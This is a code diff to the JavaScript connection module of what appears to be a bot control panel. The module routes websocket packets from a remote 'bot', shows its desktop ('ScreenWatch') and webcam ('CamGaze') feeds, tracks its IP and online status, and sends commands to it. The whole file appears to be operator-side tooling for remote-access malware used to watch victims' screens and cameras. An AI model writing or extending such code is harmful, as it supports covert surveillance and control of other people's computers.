@@ -1,8 +1,20 @@
-// frontend/client_control/js/modules/websocket/connection.js
 import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
 
-let ws;
+let ws, timer;
 const targetId = new URLSearchParams(location.search).get('id');
+
+const upUI = (id, val) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = val;
+    if (id === 'clientStatus') el.className = `value status-${val.toLowerCase()}`;
+};
+
+const activateOnline = () => {
+    clearTimeout(timer);
+    upUI('clientStatus', 'online');
+    timer = setTimeout(() => upUI('clientStatus', 'offline'), 5000);
+};
 
 export function initControlConnection() {
     const [token, login] = [localStorage.getItem('auth_token'), localStorage.getItem('user_login')];
@@ -21,31 +33,30 @@ export function initControlConnection() {
         const pkg = decodePacket(data);
         if (!pkg || (pkg.id !== targetId && pkg.id !== "0")) return;
 
+        if (pkg.module === 'DataScribe') {
+            try {
+                const d = JSON.parse(new TextDecoder().decode(pkg.payload));
+                upUI('clientId', targetId);
+                if (d.ip && d.ip !== "0.0.0.0") upUI('clientIp', d.ip);
+                if (d.status === 'online') activateOnline();
+            } catch (e) { console.error("DataScribe error"); }
+            return;
+        }
+
+        // Любой пакет от бота (ScreenWatch, CamGaze и т.д.) подтверждает онлайн
+        if (pkg.id === targetId) activateOnline();
+
+        // Роутинг на функции отрисовки
         const routes = {
-            'Desktop': window.updateDesktopFeed,
-            'Webcam': window.updateWebcamFeed,
-            'DataScribe': handleDataScribe
+            'ScreenWatch': window.updateDesktopFeed,
+            'CamGaze': window.updateWebcamFeed
         };
         routes[pkg.module]?.(pkg.payload);
     };
 
-    window.sendToBot = (mod, payload = "") => {
+    window.sendToBot = (mod, pay = "") => {
         if (ws?.readyState !== 1) return;
-        const data = typeof payload === 'string' ? new TextEncoder().encode(payload) : payload;
+        const data = typeof pay === 'string' ? new TextEncoder().encode(pay) : pay;
         ws.send(encodePacket(targetId, mod, data));
     };
-}
-
-function handleDataScribe(payload) {
-    try {
-        const data = JSON.parse(new TextDecoder().decode(payload));
-        const fields = { clientId: targetId, clientIp: data.ip || '0.0.0.0', clientStatus: data.status || 'unknown' };
-
-        Object.entries(fields).forEach(([id, val]) => {
-            const el = document.getElementById(id);
-            if (!el) return;
-            el.textContent = val;
-            if (id === 'clientStatus') el.className = `value status-${val.toLowerCase()}`;
-        });
-    } catch (e) { console.error("DataScribe error:", e); }
 }
